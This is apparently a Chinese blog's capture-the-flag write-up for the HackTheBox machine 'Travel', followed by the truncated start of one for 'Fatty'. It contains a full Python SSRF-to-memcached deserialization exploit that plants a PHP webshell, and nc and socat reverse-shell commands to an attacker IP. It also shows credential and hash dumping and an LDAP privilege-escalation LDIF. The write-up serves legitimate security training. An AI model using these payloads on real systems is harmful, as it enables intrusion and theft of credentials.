10.10.10.189Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 14:46 CSTNmap scan report for 10.10.10.189Host is up (0.066s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)80/tcp open http nginx 1.17.6|_http-server-header: nginx/1.17.6|_http-title: Travel.HTB443/tcp open ssl/http nginx 1.17.6|_http-server-header: nginx/1.17.6|_http-title: Travel.HTB - SSL coming soon.| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb| Not valid before: 2020-04-23T19:24:29|_Not valid after: 2030-04-21T19:24:29Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 30.36 seconds 并且得到几个域名，添加到hosts： 110.10.10.189 www.travel.htb blog.travel.htb blog-dev.travel.htb www blog是一个wordpress 1Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team! 这句话引导我们去关注blog-dev，有新的rss特性 ##blog-dev 但blog-dev直接访问是403 https任意一个域名改成https都是这个结果： 目录扫描123gobuster dir -u http://blog-dev.travel.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 32/.git/HEAD (Status: 200) .git有一个.git目录: https://github.com/WangYihang/GitHacker 1python GitHacker.py http:&#x2F;&#x2F;blog-dev.travel.htb&#x2F;.git&#x2F; 在git log里得到用户名： 123456commit 0313850ae948d71767aff2cc8cc0f87a0feeef63 (HEAD -&gt; master)Author: jane &lt;jane@travel.htb&gt;Date: Tue Apr 21 01:34:54 2020 -0700 moved to git(END) twentytwenty根据readme，知道用的theme： 代码审计查看代码可以知道可以使用custom_feed_url： 这个参数可以SSRF，存在过滤，很容易bypass： 同样是在代码里我们还得到了一个memcache： 1memcache:&#x2F;&#x2F;127.0.0.1:11211&#x2F;?timeout&#x3D;60&amp;prefix&#x3D;xct_ debug.php代码中还有个debug.php 12345678&lt;!--DEBUG&lt;?phpif (isset($_GET['debug']))&#123; include('debug.php');&#125;?&gt;--&gt; 结合前面theme目录： http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php 文件存在 debug信息我们可以自己开一个server，作为feed url，然后开启debug，在debug.php中得到memcache的输出： 123wget http:&#x2F;&#x2F;www.travel.htb&#x2F;newsfeed&#x2F;customfeed.xml -O feed.xmlhttp:&#x2F;&#x2F;blog.travel.htb&#x2F;awesome-rss&#x2F;?debug&amp;custom_feed_url&#x3D;http:&#x2F;&#x2F;10.10.14.29:7778&#x2F;feed.xml 1xct_2c6a1a0f11(...) | a:4:&#123;s:5:&quot;child&quot;;a:1:&#123;s:0:&quot;&quot;;a:1:&#123;(...) 后半部分是序列化数据，但xct_2c6a1a0f11这一串是什么 SimplePie根据代码知道它使用SimplePie（用于解析feed地址），并且使用memcached进行缓存。 SimplePie将序列化的对象存储在缓存中，并在使用它时对其进行反序列化，因此我们可以在此处使用反序列化攻击来获取RCE。 但是首先我们要知道它使用的key name 根据SimplePie的文档，我们可以得知它如何计算缓存名称 https://simplepie.org/api/source-class-SimplePie.html#1266 (这里就有点坑了，冒号是算在salt里的，在引号里面，需要注意) 1md5(md5($url).&quot;:spc&quot;); 所以前面的2c6a1a0f11是我们的url计算后的md5的一部分 另外给了一个类，可以将文件写到logs，所以基本就是利用反序列化写webshell： 反序列化php-serialization + ssrf + phpmemcache 搜到的脚本： https://github.com/tarunkant/Gopherus/blob/master/scripts/PHPMemcached.py 我们需要修改脚本以适用于当前情况: 1234md5(md5(&quot;http:&#x2F;&#x2F;www.travel.htb&#x2F;newsfeed&#x2F;customfeed.xml&quot;):&quot;spc&quot;)4e5612ba079c530a6b1f148c0b352241xct_key -&gt; xct_4e5612ba079c530a6b1f148c0b352241 exp修改点123code = 'O:14:\"TemplateHelper\":2:&#123;s:4:\"file\";s:'+str(len(file))+':\"'+file+'\";s:4:\"data\";s:31:\"&lt;?php system($_REQUEST[\"cmd\"]);\";&#125;'payload = \"%0d%0aset xct_4e5612ba079c530a6b1f148c0b352241 4 0 \" + str(len(code)) + \"%0d%0a\" + code + \"%0d%0a\"encodedpayload = urllib.quote_plus(payload).replace(\"+\",\"%20\").replace(\"%2F\",\"/\").replace(\"%25\",\"%\").replace(\"%3A\",\":\") 流程首先将payload通过ssrf写到memcache： 1http:&#x2F;&#x2F;blog.travel.htb&#x2F;awesome-rss&#x2F;?debug&#x3D;yes&amp;custom_feed_url&#x3D;encodedpayload 然后去访问，触发反序列化，得到webshell： 1http:&#x2F;&#x2F;blog.travel.htb&#x2F;wp-content&#x2F;themes&#x2F;twentytwenty&#x2F;logs&#x2F;file 然后系统有nc，可以直接反弹shell： 完整exp123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/pythonimport requestsimport urllibLHOST=\"10.10.14.29\"file = \"miao.php\"url = \"http://blog.travel.htb/\"def payload (): code = 'O:14:\"TemplateHelper\":2:&#123;s:4:\"file\";s:'+str(len(file))+':\"'+file+'\";s:4:\"data\";s:31:\"&lt;?php system($_REQUEST[\"cmd\"]);\";&#125;' #md5(md5(\"http://www.travel.htb/newsfeed/customfeed.xml\"):\"spc\") = 4e5612ba079c530a6b1f148c0b352241 payload = \"%0d%0aset xct_4e5612ba079c530a6b1f148c0b352241 4 0 \" + str(len(code)) + \"%0d%0a\" + code + \"%0d%0a\" encodedpayload = urllib.quote_plus(payload).replace(\"+\",\"%20\").replace(\"%2F\",\"/\").replace(\"%25\",\"%\").replace(\"%3A\",\":\") return \"gopher://127.00.0.1:11211/_\" + encodedpayloadpayload = payload()print \"[+]payload is=: \" + payloadprint \"[+] Requesting using ssrf in phpmemcache\"ssrf_url = url+\"awesome-rss/?debug=yes&amp;custom_feed_url=\"+payloadprint ssrf_urlr = requests.get(ssrf_url)print \"[+] Its time for deserialization\"r = requests.get(url+\"awesome-rss/\")payload_url = url + \"wp-content/themes/twentytwenty/logs/\"+fileprint payload_urlwhile True: print payload_url r = requests.get(payload_url) print(r.status_code) if r.status_code == 200: break;print \"[+] You are ready to go\"print \"[+] Run commands on web shell now\" www-data 直接反弹shell： 1http:&#x2F;&#x2F;blog.travel.htb&#x2F;wp-content&#x2F;themes&#x2F;twentytwenty&#x2F;logs&#x2F;miao.php?cmd&#x3D;nc%20-e%20&#x2F;bin&#x2F;bash%2010.10.14.29%201234 然后这个系统没python，有socat，可以使用socat转成交互shell： socat12345# lcoalsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.9:4444# targetsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.29:4444 然后这应该是在docker容器里： 信息搜集然后就是在docker里寻找有用信息 wp-config.php得到数据库账号密码： 123456789101112131415161718192021222324252627282930www-data@blog:/var/www/html$ cat wp-config.php&lt;?php...define( 'DB_NAME', 'wp' );/** MySQL database username */define( 'DB_USER', 'wp' );/** MySQL database password */define( 'DB_PASSWORD', 'fiFtDDV9LYe8Ti' );/** MySQL hostname */define( 'DB_HOST', '127.0.0.1' );/** Database Charset to use in creating database tables. */define( 'DB_CHARSET', 'utf8mb4' );/** The Database Collate type. Don't change this if in doubt. */define( 'DB_COLLATE', '' );...define( 'AUTH_KEY', 'W&lt;0D4W5&lt;?QQPd&gt;x1HfyprdtXl`R10M=4].x$O.nt_hAU`!`F&#125;NFpi1&amp;AavW&gt;W5rQ' );define( 'SECURE_AUTH_KEY', '`B$8*$(_rO.Wf|Z@JX#U3t!qZHLg%bF&amp;N02Bxb_4R:TLOz9qj~&#123;0Dr$otoR1;bJo' );define( 'LOGGED_IN_KEY', 'GQy$o3Zh~XUGc2;,&amp;@c8&amp;4ir)CBA)&amp;q09R!T~y+&gt;Mo9V0hLt-WEKJ&lt;07f8zY3d&#125;U' );define( 'NONCE_KEY', 'p4!$VwTVVGT-F&#125;]_0D[0dQgEnt/CH?uoQL*RD6xXE;p;@br1?ag.(Y$mmrJHR0D2' );define( 'AUTH_SALT', '/v^;MjaSq%b;?D:@Q12TCOV]j;&#123;wnN@I6!7CG]jNlf.2qBC$&lt;` wG|,zsll9RaoL' );define( 'SECURE_AUTH_SALT', 'wvOC4$,y&gt;0!g|%m1Z&#123;qdw5@bArM&#125;XRk=snP7^Eot&#123;t98[j|JS&lt;%q;%rv%IQ*`8n|' );define( 'LOGGED_IN_SALT', '=LVvb]NawR#b+U&lt;Z|Iq#*h/+G22bAxrZ|&#123;n)BLk7~w:Ol-od,HG?Xku&#125;5Y36%x@b' );define( 'NONCE_SALT', 'ZV@LQsgfC`|,&amp;LOhX%i%MuvVJ&#123;!E,PO[z3E3$CGpdfw:^t1AE@l`:7j?TN0n&#123;,,7' );... mysql1234567891011121314151617181920212223242526272829303132333435363738394041424344mysql -h 127.0.0.1 -u wp -pfiFtDDV9LYe8TiMariaDB [(none)]&gt; show DATABASES;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || wp |+--------------------+4 rows in set (0.001 sec)MariaDB [(none)]&gt; use wp;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMariaDB [wp]&gt; show tables;+-----------------------+| Tables_in_wp |+-----------------------+| wp_commentmeta || wp_comments || wp_links || wp_options || wp_postmeta || wp_posts || wp_term_relationships || wp_term_taxonomy || wp_termmeta || wp_terms || wp_usermeta || wp_users |+-----------------------+12 rows in set (0.001 sec)MariaDB [wp]&gt; select * from wp_users;+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+| ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name |+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+| 1 | admin | $P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/ | admin | admin@travel.htb | http://localhost | 2020-04-13 13:19:01 | | 0 | admin |+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+1 row in set (0.001 sec) 我们得到了一个密码hash： 1$P$BIRXVj&#x2F;ZG0YRiBH8gnRy0chBx67WuK&#x2F; john然后就是破解这个hash(其实没什么用，这是个兔子洞)： 1sudo john hash.txt -w&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt backup-13-04-2020.sql在/opt/wordpress目录下有一个backup-13-04-2020.sql文件，里面得到lynik-admin用户的密码hash： 123INSERT INTO &#96;wp_users&#96; VALUES (1,&#39;admin&#39;,&#39;$P$BIRXVj&#x2F;ZG0YRiBH8gnRy0chBx67WuK&#x2F;&#39;,&#39;admin&#39;,&#39;admin@travel.htb&#39;,&#39;http:&#x2F;&#x2F;localhost&#39;,&#39;2020-04-13 13:19:01&#39;,&#39;&#39;,0,&#39;admin&#39;),(2,&#39;lynik-admin&#39;,&#39;$P$B&#x2F;wzJzd3pj&#x2F;n7oTe2GGpi5HcIl4ppc.&#39;,&#39;lynik-admin&#39;,&#39;lynik@travel.htb&#39;,&#39;&#39;,&#39;2020-04-13 13:36:18&#39;,&#39;&#39;,0,&#39;Lynik Schmidt&#39;);&#x2F;*!40000 ALTER TABLE &#96;wp_users&#96; ENABLE KEYS *&#x2F;;UNLOCK TABLES; 这个hash是可以破解出来的： 然后我们得到一组账号密码： 1lynik-admin ： 1stepcloser user flag使用前面得到的账号密码登录，得到user.txt: 提权信息.ldaprc在当前用户目录能够发现一个.ldaprc文件，LDAP配置文件： 1234lynik-admin@travel:~$ cat .ldaprcHOST ldap.travel.htbBASE dc=travel,dc=htbBINDDN cn=lynik-admin,dc=travel,dc=htb .viminfo1234567891011121314151617181920212223242526272829303132333435363738394041424344454647lynik-admin@travel:~$ cat .viminfo# This viminfo file was generated by Vim 8.1.# You may edit it if you're careful!# Viminfo version|1,4# Value of 'encoding' when this file was written*encoding=utf-8# hlsearch on (H) or off (h):~h# Command Line History (newest to oldest)::wq!|2,0,1587670530,,\"wq!\"# Search String History (newest to oldest):# Expression History (newest to oldest):# Input Line History (newest to oldest):# Debug Line History (newest to oldest):# Registers:\"\"1 LINE 0 BINDPW Theroadlesstraveled|3,1,1,1,1,0,1587670528,\"BINDPW Theroadlesstraveled\"# File marks:'0 3 0 ~/.ldaprc|4,48,3,0,1587670530,\"~/.ldaprc\"# Jumplist (newest first):-' 3 0 ~/.ldaprc|4,39,3,0,1587670530,\"~/.ldaprc\"-' 1 0 ~/.ldaprc|4,39,1,0,1587670527,\"~/.ldaprc\"# History of marks within files (newest to oldest):&gt; ~/.ldaprc * 1587670529 0 \" 3 0 . 4 0 + 4 0 里面有一行： 1BINDPW Theroadlesstraveled /etc/hostshosts里得到ldap地址： 1234567891011lynik-admin@travel:~$ cat /etc/hosts127.0.0.1 localhost127.0.1.1 travel172.20.0.10 ldap.travel.htb# The following lines are desirable for IPv6 capable hosts::1 ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters LDAP根据相关教程 How To Manage and Use LDAP Servers with OpenLDAP Utilities | DigitalOceanhttps://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities 123456789101112131415161718192021222324252627282930313233343536373839404142434445lynik-admin@travel:~$ ldapsearch -x -w Theroadlesstraveled...# admin, travel.htbdn: cn=admin,dc=travel,dc=htbobjectClass: simpleSecurityObjectobjectClass: organizationalRolecn: admindescription: LDAP administrator# servers, travel.htbdn: ou=servers,dc=travel,dc=htbdescription: ServersobjectClass: organizationalUnitou: servers# lynik-admin, travel.htbdn: cn=lynik-admin,dc=travel,dc=htbdescription: LDAP administratorobjectClass: simpleSecurityObjectobjectClass: organizationalRolecn: lynik-adminuserPassword:: e1NTSEF9MEpaelF3blZJNEZrcXRUa3pRWUxVY3ZkN1NwRjFRYkRjVFJta3c9PQ= = ...# domainusers, groups, linux, servers, travel.htbdn: cn=domainusers,ou=groups,ou=linux,ou=servers,dc=travel,dc=htbmemberUid: frankmemberUid: brianmemberUid: christophermemberUid: johnnymemberUid: juliamemberUid: jerrymemberUid: louisememberUid: eugenememberUid: edwardmemberUid: gloriamemberUid: lynikgidNumber: 5000cn: domainusersobjectClass: topobjectClass: posixGroup... 因为我们是ldap管理员，我们可以修改配置使得某个用户在sudoers组中，从而可以sudo以root权限执行任意命令 参考资料： How To Use LDIF Files to Make Changes to an OpenLDAP System | DigitalOceanhttps://www.digitalocean.com/community/tutorials/how-to-use-ldif-files-to-make-changes-to-an-openldap-system Sudoers LDAP Manualhttps://www.sudo.ws/man/1.8.16/sudoers.ldap.man.html Ubuntu Manpage: sudoers.ldap — sudo LDAP configurationhttp://manpages.ubuntu.com/manpages/trusty/man5/sudoers.ldap.5.html jane.ldif以jane为例，首先我们准备一个配置文件,设置密码及ssh公钥： 12345678910111213141516dn: uid&#x3D;jane,ou&#x3D;users,ou&#x3D;linux,ou&#x3D;servers,dc&#x3D;travel,dc&#x3D;htbchangetype: modifyreplace: homeDirectoryhomeDirectory: &#x2F;root-add: objectClassobjectClass: ldapPublicKey-add: sshPublicKeysshPublicKey: ssh-rsa xxxxxxxx-replace: userPassworduserPassword: miao2333-replace: gidNumbergidNumber: 27 ldapmodify12lynik-admin@travel:/tmp$ ldapmodify -D \"cn=lynik-admin,dc=travel,dc=htb\" -w Theroadlesstraveled -f jane.ldifmodifying entry \"uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb\" Jane login然后我们就可以登录jane： root flagjane可以sudo执行任意命令，密码就是我们前面配置文件里设置的： 参考资料 https://github.com/WangYihang/GitHacker https://simplepie.org/api/source-class-SimplePie.html#1266 https://github.com/tarunkant/Gopherus/blob/master/scripts/PHPMemcached.py How To Manage and Use LDAP Servers with OpenLDAP Utilities | DigitalOceanhttps://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities How To Use LDIF Files to Make Changes to an OpenLDAP System | DigitalOceanhttps://www.digitalocean.com/community/tutorials/how-to-use-ldif-files-to-make-changes-to-an-openldap-system Sudoers LDAP Manualhttps://www.sudo.ws/man/1.8.16/sudoers.ldap.man.html Ubuntu Manpage: sudoers.ldap — sudo LDAP configurationhttp://manpages.ubuntu.com/manpages/trusty/man5/sudoers.ldap.5.html HackTheBox - Travelhttps://shubhkumar.in/htb/travel/ Hackthebox Travel writeup | 0xPrashanthttps://0xprashant.github.io/posts/htb-travel/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Fatty - HackTheBox","slug":"Fatty-HackTheBox","date":"2020-08-12T00:57:04.000Z","updated":"2020-08-12T00:58:17.774Z","comments":true,"path":"2020/08/12/Fatty-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/08/12/Fatty-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/227 10.10.10.174 端口扫描 需要全端口扫描，有几个非常见端口： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212$ nmap -p- 10.10.10.174Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-05 12:17 CSTNmap scan report for 10.10.10.174Host is up (0.069s latency).Not shown: 65530 closed portsPORT STATE SERVICE21/tcp open ftp22/tcp open ssh1337/tcp open waste1338/tcp open wmc-log-svc1339/tcp open kjtsiteserverNmap done: 1 IP address (1 host up) scanned in 103.34 seconds$ nmap -sC -sV -p 21,22,1337,1338,1339 10.10.10.174Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-05 12:25 CSTNmap scan report for 10.10.10.174Host is up (0.068s latency).PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 ftp ftp 15426727 Oct 30 2019 fatty-client.jar| -rw-r--r-- 1 ftp ftp 526 Oct 30 2019 note.txt| -rw-r--r-- 1 ftp ftp 426 Oct 30 2019 note2.txt|_-rw-r--r-- 1 ftp ftp 194 Oct 30 2019 note3.txt| ftp-syst:| STAT:| FTP server status:| Connected to 10.10.14.10| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)| ssh-hostkey:| 2048 fd:c5:61:ba:bd:a3:e2:26:58:20:45:69:a7:58:35:08 (RSA)|_ 256 4a:a8:aa:c6:5f:10:f0:71:8a:59:c5:3e:5f:b9:32:f7 (ED25519)1337/tcp open ssl/waste?| fingerprint-strings:| GetRequest:| dvK.| HTTPOptions:| *&#123;nqfU| B9Eq| ~yn'| \\xf8| RPCCheck:| e:g@| \\x96| 3I\\x9by| )rB#Z| RTSPRequest:|_ smV6:| ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE| Not valid before: 2019-09-11T15:42:00|_Not valid after: 2020-09-10T15:42:00|_ssl-date: 2020-08-05T04:26:47+00:00; -1s from scanner time.1338/tcp open ssl/wmc-log-svc?| fingerprint-strings:| GenericLines, NULL:| #z*]T| 2\"&#123;n| L;8q| GetRequest:| =Ktk6| RTSPRequest:|_ \\x1b| ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE| Not valid before: 2019-09-11T15:42:00|_Not valid after: 2020-09-10T15:42:00|_ssl-date: 2020-08-05T04:26:47+00:00; -1s from scanner time.1339/tcp open ssl/kjtsiteserver?| fingerprint-strings:| GenericLines, NULL:| 'V[;| GetRequest:| X&gt;_L| HTTPOptions:| 7,TC| \\xcf| RPCCheck:| SeM^| #!1K| RTSPRequest:| M)V.e/|_ dg9wm| ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE| Not valid before: 2019-09-11T15:42:00|_Not valid after: 2020-09-10T15:42:00|_ssl-date: 2020-08-05T04:26:47+00:00; -1s from scanner time.3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port1337-TCP:V=7.80%T=SSL%I=7%D=8/5%Time=5F2A34DE%P=x86_64-apple-darwinSF:18.6.0%r(NULL,80,\"\\xdcd\\x88\\x8c\\xa1\\xcf\\xcd\\xf1r'\\.\\x1d'\\xa09\\xd6\\xebi\\SF:x0e\\xe2\\xc2dz\\xbf\\x02\\x9c\\xa4\\xe5\\x80\\xbcj\\+\\\\0\\xdb\\xcc\\xd5t\\x1a\\xba&#125;\\xSF:ddm&amp;\\xc8\\|Z\\xbd\\x99\\xfff\\xdc!&#123;\\x05\\xfb\\xc3\\xc7b\\xb8\\x01\\x01\\x137\\xa9R\\xSF:be\\x04\\x82\\x1fIb\\xa7\\xef\\x90\\x85\\0\\xa4\\x87\\x95@M\\xaf\\xe47Z\\x01\\x03\\x10\\SF:x80K\\xcd\\x07X\\xfbQ8;\\x929\\xf8j_\\xfa\\x19L\\x941H\\xab\\x8c\\xaa\\x99\\x04\\x83VSF:B\\x99A&#123;\\x9b\\x06`\\xcc\\xdd\\xd4\\xc69\")%r(GenericLines,80,\"\\xdcd\\x88\\x8c\\xaSF:1\\xcf\\xcd\\xf1r'\\.\\x1d'\\xa09\\xd6\\xebi\\x0e\\xe2\\xc2dz\\xbf\\x02\\x9c\\xa4\\xe5\\SF:x80\\xbcj\\+\\\\0\\xdb\\xcc\\xd5t\\x1a\\xba&#125;\\xddm&amp;\\xc8\\|Z\\xbd\\x99\\xfff\\xdc!&#123;\\x05SF:\\xfb\\xc3\\xc7b\\xb8\\x01\\x01\\x137\\xa9R\\xbe\\x04\\x82\\x1fIb\\xa7\\xef\\x90\\x85\\0SF:\\xa4\\x87\\x95@M\\xaf\\xe47Z\\x01\\x03\\x10\\x80K\\xcd\\x07X\\xfbQ8;\\x929\\xf8j_\\xfSF:a\\x19L\\x941H\\xab\\x8c\\xaa\\x99\\x04\\x83VB\\x99A&#123;\\x9b\\x06`\\xcc\\xdd\\xd4\\xc69\"SF:)%r(GetRequest,80,\"u8Y\\xf7\\xd1\\x7f\\xe5\\x7f\\x1dOO\\xfe\\x08h\\x97\\x01\\xb9\\xSF:01Y\\xb0m\\xb3\\xe4\\xbc\\xef\\x12\\xc1\\xf7n&gt;\\x16\\xc5\\xe2z=\\x07\\xdc\\x0c%\\x08V\\SF:xdb@\\xe0N\\xef\\0\\xb7L\\xacU\\]\\xcc\\x95OO1\\xea\\xd2\\$wC\\x19#\\xa6\\xba\\$7h\\x88SF:\\x0b\\xe5\\x82\\x83\\xe2\\xd4\\xbd\\x8a\\xc3\\x1d_\\xab\\xbf\\x89\\xc1\\+\\x1d2xq\\xbf\\SF:[\\x98S\\xd4\\xc2\\xa1\\x1d\\xd0v\\xd7\\x172\\xee\\x15\\xbaU\\x03\\x05\\xc8\\x1d\\xfd\\xSF:0b:\\x8c2S\\)\\0\\x17\\xca\\x8c\\x14\\x17dvK\\.\")%r(HTTPOptions,80,\"\\*&#123;nqfU\\x98\\SF:x04\\xa0\\x12\\$;\\xc2\\x9e\\xee\\xf3\\xe9\\x7f\\x90\\xf2:\\+\\xb3\\)\\xa7'\\x9e\\x03\\x9SF:9&lt;\\x1b\\x1d\\xbe\\xa8B9Eq\\xaf&lt;\\xe7\\x80\\x85W\\xe3b\\x86\\x8a,\\xe3\\x96\\x1a\\x20\\SF:xde\\xd7\\x87Q\\xcc&lt;E\\xe6\\*o\\x1b\\x98\\xf4\\x93t\\x11\\xa9\\xe0\\xf6s\\xcb\\xa5\\x80SF:\\x19\\x1b\\xaa\\x15\\x9c\\n~yn'\\xe0\\xaa\\x8e\\xd6\\x97\\x8d\\xa1#\\xcb\\xfe\\x94\\xb9SF:l\\|\\x87\\x0e/\\xf9\\x8aW\\xa1\\x0b\\xfc\\x1dn\\xe5\\x7f\\xb5\\xa5W\\x88\\xb1\\xb3\\xf3SF:\\xa2\\xcf\\x95\\x86\\\\\\xf8\\xcb\\r\")%r(RTSPRequest,80,\"\\x1b\\x836\\x8e\\xe3\\x1a\\SF:xe2\\x08\\x9e\\xc8\\xd3\\x12Y\\xcd_t\\xfei\\x17C\\xb5\\xc5\\xe28\\xc61\\x8aE\\xd9\\x85SF:&#125;H\\xc8\\xb4\\xc6\\xc7\\xc6\\x96\\xd5\\x1f\\x86\\x0bp\\0\\xbch\\xdb\\xd3\\xc0\\[\\xc9-\\xSF:c0uC\\x80\\xf0\\xc9\\x04\\xc2\\x95;\\x1cC~\\xad\\xf5\\x020\\xf5\\tS\\x8d\\xfe\\x0fVI\\xSF:bb\\xd1\\x13\\x97o0\\xeau`\\x0e\\x08=\\xe2JJ\\(\\x84\\xddaO\\x06\\xda&lt;\\x156\\x01t\\xaSF:1\\xbd\\x02\\x9d\\x97N\\x03UE\\x82smV6:\\x94\\x14\\x86\\x06\\xd2\\x8c\\x19\\xa64\")%r(SF:RPCCheck,80,\"@\\xd2\\xb5\\x0c\\xf2\\x8cm\\)s\\xd6\\|\\xddgW\\|\\xb2\\xf5\\xc5\\x93\\(\\SF:xaei\\xbc!b\\x93\\x13\\xd8\\xd9\\xf7e:g@\\x86\\xfeB\\xad\\x93sL\\xb5\\(Ia\\x86s\\xe6\\SF:xae\\xd2\\\\\\x96\\xb2\\x9f\\x9cg\\xf2\\x06P\\xecV\\xe9\\x81#\\)\\x9c\\)T\\x83\\xe1_p\\xeSF:8\\|@\\xc0tTU\\x0b\\x8b\\xcbK\\x97\\x0b\\x16\\*\\xe3\\xdc\\xc74\\xb3\\^\\xa2\\x1b`\\xb5\\SF:xa1\\x10\\xf4\\xbb\\xdbwc\\x0c\\xcc3I\\\\\\x9by\\x8e\\)rB#Z\\xcc\\xca\\x05\\xb7\\?\\)\\xbSF:1\\x95\\x0c\\xcd\\xe3\");==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port1338-TCP:V=7.80%T=SSL%I=7%D=8/5%Time=5F2A34DE%P=x86_64-apple-darwinSF:18.6.0%r(NULL,80,\"%\\xda#\\x02\\xac\\x9d\\xae\\xb6\\xb1#z\\*\\]T\\x10\\xe3_\\\"\\xd2fSF:\\xc01\\x922\\\"&#123;n\\xf6\\xc7L;8q\\xce-\\x8f\\x17o\\xafY\\xf1\\xfb5\\$\\x07\\xed\\xcb\\xbSF:5Q\\x06\\xb6r\\x17I&#125;\\xac\\xf1\\xdb'\\xac\\x91\\xb9\\x9f\\xf6\\xcc\\r\\x84\\xe2\\xcf&gt;\\xSF:17\\xc8\\xa0\\\"\\x01\\xa1\\xe4\\x85\\xcf\\xdf\\)\\t\\xd8Jz\\x9cQ\\xfdR\\xe3\\x82u\\x93\\xSF:96\\^\\x8da\\xf3\\x96\\xc2\\xe2\\x98O\\x96Y\\xf2%\\xc5\\xb1\\x0c\\x80\\x02\\x98=\\x9f\\xSF:94\\x92\\xdf\\xf1\\xbf\\|M-\\xc5c\\xcfr\\x97\")%r(GenericLines,80,\"%\\xda#\\x02\\xaSF:c\\x9d\\xae\\xb6\\xb1#z\\*\\]T\\x10\\xe3_\\\"\\xd2f\\xc01\\x922\\\"&#123;n\\xf6\\xc7L;8q\\xce-SF:\\x8f\\x17o\\xafY\\xf1\\xfb5\\$\\x07\\xed\\xcb\\xb5Q\\x06\\xb6r\\x17I&#125;\\xac\\xf1\\xdb'\\SF:xac\\x91\\xb9\\x9f\\xf6\\xcc\\r\\x84\\xe2\\xcf&gt;\\x17\\xc8\\xa0\\\"\\x01\\xa1\\xe4\\x85\\xcSF:f\\xdf\\)\\t\\xd8Jz\\x9cQ\\xfdR\\xe3\\x82u\\x93\\x96\\^\\x8da\\xf3\\x96\\xc2\\xe2\\x98O\\SF:x96Y\\xf2%\\xc5\\xb1\\x0c\\x80\\x02\\x98=\\x9f\\x94\\x92\\xdf\\xf1\\xbf\\|M-\\xc5c\\xcfSF:r\\x97\")%r(GetRequest,80,\"~\\xf8\\0\\xaf\\xc7\\xbc\\xfa\\xeb\\xdc\\xd3:\\x16w\\x05\\SF:x863\\[\\+\\xad1&#125;\\xd2\\xbb\\x1f\\xe0-\\x8a\\x93/\\x154u\\xb9\\x0b=Ktk6\\x17f\\x8fc\\xSF:aeW\\)8\\xba\\xa4\\x88\\xad\\xa3\\x84&amp;!\\xc7\\|1\\xb1\\x8du\\xb0GvN\\x07\\x02ZJ\\xa9!HSF:\\xb6W\\xc3\\xb6\\xa9\\(\\xdc\\]\\xd5\\xbc\\x08\\x1a\\x16\\xc6JU\\xe6\\x04\\?\\xe3\\xfd#\\SF:x9c\\x9a\\x18\\xc8\\xa1\\xffh\\x1f_\\xf9\\xd0\\?;\\x1a\\x03\\x17\\xff\\xe8\\xb4\\r_\\x8cSF:\\xb3\\xf3\\x04\\xe1\\x9fs&amp;\\x9c\\xdd\\x16\\x92\\xfe\")%r(HTTPOptions,80,\"\\xcc\\xd2SF:\\xb7\\x81h\\x17Nn\\xc4L\\x81\\xf7r\\xcb\\x8ezy\\xd9\\xeaY\\rA\\x10c\\x9b\\x88\\+\\x04dSF:\\xb6\\x1d\\x05\\x14&#123;\\x8e\\xf5\\xce\\xae\\xc8E\\[\\xcb\\x90ci\\x87\\tDg\\x93\\xab'\